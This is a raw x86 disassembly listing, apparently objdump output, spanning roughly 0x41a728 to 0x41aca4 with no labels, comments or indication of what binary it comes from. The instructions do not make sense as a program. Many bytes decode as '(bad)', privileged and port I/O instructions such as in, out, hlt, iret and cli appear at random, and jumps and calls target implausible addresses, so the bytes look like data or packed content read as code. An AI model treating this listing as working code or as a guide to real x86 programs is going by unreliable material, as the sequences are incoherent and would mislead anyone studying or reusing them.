  41a728:	dec    ebp
  41a729:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  41a72f:	mov    DWORD PTR [ebp-0x14],edx
  41a732:	push   ecx
  41a733:	jne    0x41a768
  41a735:	mov    edi,DWORD PTR [ebx+0x4d720c]
  41a73b:	call   0xff879903
  41a740:	mov    eax,DWORD PTR [ebp-0x4]
  41a743:	mov    edi,0x4585c3d8
  41a749:	clc    
  41a74a:	mov    eax,DWORD PTR [ebp-0x8]
  41a74d:	xor    eax,DWORD PTR [eax+0x3]
  41a750:	adc    DWORD PTR [eax+0xc],0x45
  41a754:	inc    ebp
  41a755:	push   eax
  41a756:	mov    ebx,ebp
  41a758:	clc    
  41a759:	inc    DWORD PTR [eax-0x75]
  41a75c:	mov    esi,eax
  41a75e:	clc    
  41a75f:	rol    BYTE PTR [ebp+0x4545544e],0x33
  41a766:	je     0x41a76b
  41a768:	mov    edx,DWORD PTR [eax+0x38]
  41a76b:	jne    0x41a7ba
  41a76d:	lea    ecx,[ebx-0x817ab44]
  41a773:	mul    BYTE PTR [ebx]
  41a775:	dec    DWORD PTR [ebx+0x4089f845]
  41a77b:	fadd   DWORD PTR [ebx]
  41a77d:	inc    ebp
  41a77e:	jmp    0x41a70b
  41a780:	mov    ecx,DWORD PTR [esp+edx*2]
  41a783:	rol    DWORD PTR [ebp+0x45],0x8b
  41a787:	mov    edi,esp
  41a789:	lock (bad) 
  41a78b:	dec    ebp
  41a78c:	ret    
  41a78d:	mov    eax,DWORD PTR [ebp+0x10]
  41a790:	mov    eax,DWORD PTR [ecx-0x4]
  41a793:	mov    eax,edi
  41a795:	fadd   st,st(3)
  41a797:	enter  0x1645,0x8b
  41a79b:	inc    ebp
  41a79c:	cld    
  41a79d:	mov    ecx,DWORD PTR [ebp+0xc]
  41a7a0:	xor    ecx,DWORD PTR [ebp+0x3]
  41a7a3:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  41a7a9:	sub    eax,DWORD PTR [ebp-0x17]
  41a7ac:	xor    eax,DWORD PTR [edx]
  41a7ae:	pushf  
  41a7af:	add    bh,al
  41a7b1:	or     al,0xd8
  41a7b3:	jne    0x41a73a
  41a7b5:	(bad)  
  41a7b6:	clc    
  41a7b7:	mov    al,0x45
  41a7b9:	call   0xffde9dfb
  41a7be:	jmp    0xddaaf4
  41a7c3:	mov    DWORD PTR [ebp-0x30],eax
  41a7c6:	xor    eax,DWORD PTR [ebp+0x3]
  41a7c9:	xor    BYTE PTR [ecx+0x45c7f49c],cl
  41a7cf:	enter  0x8503,0xc
  41a7d3:	clc    
  41a7d4:	inc    ebp
  41a7d5:	inc    ebp
  41a7d6:	push   DWORD PTR [edx]
  41a7d8:	in     al,dx
  41a7d9:	pushf  
  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
